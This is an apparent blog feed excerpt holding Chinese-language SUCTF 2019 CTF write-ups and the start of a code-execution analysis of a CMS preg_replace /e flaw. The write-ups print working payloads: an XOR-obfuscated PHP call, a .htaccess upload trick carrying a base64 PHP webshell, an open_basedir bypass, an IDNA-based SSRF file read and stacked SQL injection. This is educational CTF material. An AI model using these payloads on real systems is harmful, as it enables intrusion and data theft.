cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">%e</span>9<span class="built_in">%e</span>9<span class="built_in">%e</span>9<span class="built_in">%e</span>9<span class="symbol">^%b6</span><span class="built_in">%ae</span><span class="built_in">%ac</span><span class="built_in">%bd</span></span><br></pre></td></tr></table></figure><p>然后有如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br></pre></td></tr></table></figure><p>这里需要使字符串去重后小于等于12，于是构造出如下payload</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="meta">%e9</span><span class="meta">%e9</span><span class="meta">%e9</span><span class="meta">%e9</span>^<span class="meta">%b6</span><span class="meta">%ae</span><span class="meta">%ac</span><span class="meta">%bd</span>&#125;&#123;<span class="meta">%bd</span>&#125;();</span><br></pre></td></tr></table></figure><p>然后调用函数 <code>get_the_flag()</code> 并构造上传表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://47.111.59.243:9001/?_=$&#123;%e9%e9%e9%e9^%b6%ae%ac%bd&#125;&#123;%bd&#125;();&amp;%bd=get_the_flag"</span> <span class="attr">method</span>=<span class="string">"post"</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传这里需要绕过图片头和&lt;?的校验，可以用.htaccess</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//.htaccess</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xlogo_width 200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xlogo_height 200</span></span><br><span class="line">AddType application/x-httpd-php .gif</span><br><span class="line">php_value auto_append_file <span class="string">"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_8dda1f908043a81b3539472e2846b908/evil.gif"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//evil.gif</span></span><br><span class="line">GIF89a12PD9waHAgZXZhbCgkX1BPU1RbJ2MnXSk7Pz4=</span><br></pre></td></tr></table></figure><p>成功的getshell后访问跟目录时才发现是没有权限的，查看phpinfo的信息可以看到开启了open_basedir</p><p><img src="https://i.loli.net/2019/08/19/fahr5C1sOxvwBl4.png" alt=""></p><p>同时还禁用了一些函数</p><p><img src="https://i.loli.net/2019/08/19/MNj5XRCynTAGSq4.png" alt=""></p><p>尝试baypass open_basedir并用scandir()查看跟目录文件</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'upload'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="selector-tag">var_dump</span>(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/19/2qDlnVemMB3W54K.png" alt=""></p><p>读取flag</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'upload'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="selector-tag">var_dump</span>(scandir(<span class="string">'/'</span>));<span class="selector-tag">chdir</span>(<span class="string">'/'</span>);<span class="selector-tag">var_dump</span>(file_get_contents(<span class="string">'THis_Is_tHe_F14g'</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/19/MSxE3dIWkBDoRKe.png" alt=""></p><h1 id="Pythonginx"><a href="#Pythonginx" class="headerlink" title="Pythonginx"></a>Pythonginx</h1><p>主要代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure><p>我们需要最后利用下面的代码来读取文件</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">return</span> <span class="selector-tag">urllib</span><span class="selector-class">.request</span><span class="selector-class">.urlopen</span>(<span class="selector-tag">finalUrl</span>)<span class="selector-class">.read</span>()</span><br></pre></td></tr></table></figure><p>附上调试代码</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from urllib.parse import *</span><br><span class="line">url = <span class="string">"file://suctf.cc"</span></span><br><span class="line">host = urlparse(url)</span><br><span class="line">print(host.hostname)</span><br><span class="line">parts = list(urlsplit(url))</span><br><span class="line">print(parts)</span><br><span class="line">host = parts[1]</span><br><span class="line"><span class="section">print("host:"+host)</span></span><br><span class="line">print(parts)</span><br><span class="line">finalUrl = urlunsplit(parts).split(' ')[0]</span><br><span class="line">print(finalUrl)</span><br><span class="line">host = urlparse(finalUrl).hostname</span><br><span class="line"><span class="section">print("host:"+host)</span></span><br></pre></td></tr></table></figure><p>根据提示先读取nginx配置文件得到flag路径，然后读取flag</p><p><img src="https://i.loli.net/2019/08/19/zj17Pwx4mDdgpFK.png" alt=""></p><p><img src="https://i.loli.net/2019/08/19/AzgwZrDQ4xs7B2h.png" alt=""></p><h1 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h1><p>源码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    include_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">    $post = array();</span><br><span class="line">    $get = array();</span><br><span class="line">    global $MysqlLink;</span><br><span class="line"></span><br><span class="line">    //GetPara();</span><br><span class="line">    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);</span><br><span class="line">    if(!$MysqlLink)&#123;</span><br><span class="line">        die(&quot;Mysql Connect Error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    if(!$selectDB)&#123;</span><br><span class="line">        die(&quot;Choose Database Error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    foreach ($_POST as $k=&gt;$v)&#123;</span><br><span class="line">        if(!empty($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($_GET as $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //die();</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/a&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    if(isset($post[&apos;query&apos;]))&#123;</span><br><span class="line">        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;</span><br><span class="line">        //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]));</span><br><span class="line">        if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]))&#123;</span><br><span class="line">            //echo $post[&apos;query&apos;];</span><br><span class="line">            die(&quot;Nonono.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(strlen($post[&apos;query&apos;])&gt;40)&#123;</span><br><span class="line">            die(&quot;Too long.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        do&#123;</span><br><span class="line">            if($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                while($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;while(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><p>主要的源码在这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">       &#125;</span><br><span class="line">$sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br></pre></td></tr></table></figure><p>看样子应该是堆叠了，但是一直不知道 || 应该怎么用，后来看到这么一篇文章</p><p><a href="https://blog.csdn.net/lixora/article/details/60572357" target="_blank" rel="noopener">https://blog.csdn.net/lixora/article/details/60572357</a></p><p>首先设置sql_mode模式为pipes_as_concat，然后来拼接语句，本地实验了一下</p><p><img src="https://i.loli.net/2019/08/19/a675ZHfQ2nM1SOi.png" alt=""></p><p>自然的题目中对应的$post[‘query’]就是这个</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="builtin-name">set</span> <span class="attribute">sql_mode</span>=pipes_as_concat;select 1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/19/rTP7iIA3UYENfR9.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CheckIn&quot;&gt;&lt;a href=&quot;#CheckIn&quot; class=&quot;headerlink&quot; title=&quot;CheckIn&quot;&gt;&lt;/a&gt;CheckIn&lt;/h1&gt;&lt;p&gt;题目是一个上传页面，中间件是nginx，尝试上传正常的图片返回如下结果&lt;/p&gt;
&lt;p&gt;&lt;img sr
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://yml-sec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>某cms5-5代码执行分析</title>
    <link href="https://yml-sec.top/2019/08/13/%E6%9F%90cms5-5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/"/>
    <id>https://yml-sec.top/2019/08/13/%E6%9F%90cms5-5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/</id>
    <published>2019-08-13T06:00:16.000Z</published>
    <updated>2019-08-13T09:24:30.119Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>该处漏洞主要是<strong>preg_replace</strong> 函数/e模式下存在的代码执行问题，虽然该程序版本较老，但该问题在其他程序中仍时有存在</p><p>漏洞触发点在 lib/tool/form.php文件中，关键代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getform</span><span class="params">($name,$form,$field,$data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (get(<span class="string">'table'</span>) &amp;&amp;<span class="keyword">isset</span>(setting::$var[get(<span class="string">'table'</span>)][$name]))</span><br><span class="line">            $form[$name]=setting::$var[get(<span class="string">'table'</span>)][$name];</span><br><span class="line">        <span class="keyword">if</span> (get(<span class="string">'form'</span>) &amp;&amp;<span class="keyword">isset</span>(setting::$var[get(<span class="string">'form'</span>)][$name]))</span><br><span class="line">            $form[$name]=setting::$var[get(<span class="string">'form'</span>)][$name];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($form[$name][<span class="string">'default'</span>]))</span><br><span class="line">            $form[$name][<span class="string">'default'</span>]=preg_replace(<span class="string">'/\&#123;\?([^&#125;]+)\&#125;/e'</span>,<span class="string">"eval('return $1;')"</span>,$form[$name][<span class="string">'default'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[$name]) &amp;&amp;<span class="keyword">isset</span>($form[$name][<span class="string">'default'</span>]))</span><br><span class="line">            $data[$name]=@$form[$name][<span class="string">'default'</span>];</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/templat/'</span>,$name) &amp;&amp;<span class="keyword">empty</span>($data[$name]))</span><br><span class="line">            $data[$name]=@$form[$name][<span class="string">'default'</span>];</span><br><span class="line">        <span class="keyword">if</span> (@$form[$name][<span class="string">'filetype'</span>] == <span class="string">'image'</span>) &#123;</span><br><span class="line">            $return=form::upload_image($name,front::post($name) ?front::post($name) : @$data[$name]);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>关键点在于这句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($form[$name][<span class="string">'default'</span>]))</span><br><span class="line">            $form[$name][<span class="string">'default'</span>]=preg_replace(<span class="string">'/\&#123;\?([^&#125;]+)\&#125;/e'</span>,<span class="string">"eval('return $1;')"</span>,$form[$name][<span class="string">'default'</span>]);</span><br></pre></td></tr></table></figure><p>当if条件成立时，就会引发代码执行问题</p><p>下面寻找触发getform函数的代码</p><p><img src="https://i.loli.net/2019/08/13/nsBuUXdalyfo3Sg.png" alt=""></p><p>可以看到该函数存在六处调用，尝试跟进第一处</p><p>代码位于 cache/template/default/manage/#guestadd.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> form::getform(<span class="string">'catid'</span>,$form,$field,$data);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>该段直接调用了静态方法getform，但目前并不知道 catid是什么，尝试全局搜索</p><p>在/lib/table/archive.php中找到了catid 相关的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_form</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'catid'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(category::option(<span class="number">0</span>,<span class="string">'tolast'</span>)),</span><br><span class="line">                        <span class="string">'default'</span>=&gt;get(<span class="string">'catid'</span>),</span><br><span class="line">                        <span class="string">'regex'</span>=&gt;<span class="string">'/\d+/'</span>,</span><br><span class="line">                        <span class="string">'filter'</span>=&gt;<span class="string">'is_numeric'</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'typeid'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(type::option(<span class="number">0</span>,<span class="string">'tolast'</span>)),</span><br><span class="line">                        <span class="string">'default'</span>=&gt;get(<span class="string">'typeid'</span>),</span><br><span class="line">                        <span class="string">'regex'</span>=&gt;<span class="string">'/\d+/'</span>,</span><br><span class="line">                        <span class="string">'filter'</span>=&gt;<span class="string">'is_numeric'</span>,</span><br><span class="line">                ),</span><br><span class="line"><span class="string">'toppost'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">'不置顶'</span>,<span class="number">2</span>=&gt;<span class="string">'栏目置顶'</span>,<span class="number">3</span>=&gt;<span class="string">'全站置顶'</span>)),</span><br><span class="line">                        <span class="string">'default'</span>=&gt;<span class="number">0</span>,</span><br><span class="line">                        <span class="string">'regex'</span>=&gt;<span class="string">'/\d+/'</span>,</span><br><span class="line">                        <span class="string">'filter'</span>=&gt;<span class="string">'is_numeric'</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'ishtml'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'radio'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">'继承'</span>,<span class="number">1</span>=&gt;<span class="string">'生成'</span>,<span class="number">2</span>=&gt;<span class="string">'不生成'</span>)),</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'checked'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'radio'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(form::yesornotoarray(<span class="string">'审核'</span>)),</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'image'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'filetype'</span>=&gt;<span class="string">'image'</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'thumb'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'filetype'</span>=&gt;<span class="string">'thumb'</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'displaypos'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'checkbox'</span>,</span><br><span class="line">                        <span class="comment">//'select'=&gt;form::arraytoselect(array(1=&gt;'首页推荐',2=&gt;'首页焦点',3=&gt;'首页头条',4=&gt;'列表页推荐',5=&gt;'内容页推荐')),</span></span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'htmlrule'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="comment">//'tips'=&gt;" 默认：&#123;?category::gethtmlrule(get('id'),'showhtmlrule')&#125;",</span></span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'template'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(front::$view-&gt;archive_tpl_list(<span class="string">'archive/show'</span>)),</span><br><span class="line">                        <span class="comment">//'tips'=&gt;" 默认：&#123;?category::gettemplate(get('id'),'showtemplate')&#125;",</span></span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'showform'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(get_my_tables_list()),</span><br><span class="line">                        <span class="string">'default'</span>=&gt;<span class="string">"0"</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'introduce_len'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'default'</span>=&gt;config::get(<span class="string">'archive_introducelen'</span>)</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'attr1'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'checkbox'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(<span class="keyword">$this</span>-&gt;getattrs(<span class="number">1</span>)),</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'grade'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'radio'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(<span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)),</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'pics'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'filetype'</span>=&gt;<span class="string">'image2'</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'author'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'tips'</span>=&gt;<span class="string">' '</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'attr3'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'tips'</span>=&gt;<span class="string">' '</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'htmlrule'</span>=&gt;<span 